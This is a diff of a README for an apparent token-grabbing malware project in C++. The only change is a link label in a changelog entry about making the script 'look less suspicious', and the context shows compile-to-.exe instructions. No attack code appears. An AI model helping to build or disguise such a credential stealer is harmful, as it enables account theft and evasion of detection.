@@ -4,7 +4,7 @@
 # Some weird but interesting changelog  
   - 23 / March / 2020 
     + Still trying to figure out how to send a request in c++ without using extra files
-    + Found out how to make this script look less suspicious [Line 58 Of the code](https://github.com/xanthe1337/Token-Grabber/blob/master/TokenGraber/TokenGrabber.cpp#L58)
+    + Found out how to make this script look less suspicious [Jump to line 58!](https://github.com/xanthe1337/Token-Grabber/blob/master/TokenGraber/TokenGrabber.cpp#L58)
 
 # How to compile to .exe?
  - Download: [Download GCC!](https://jmeubank.github.io/tdm-gcc/download/)
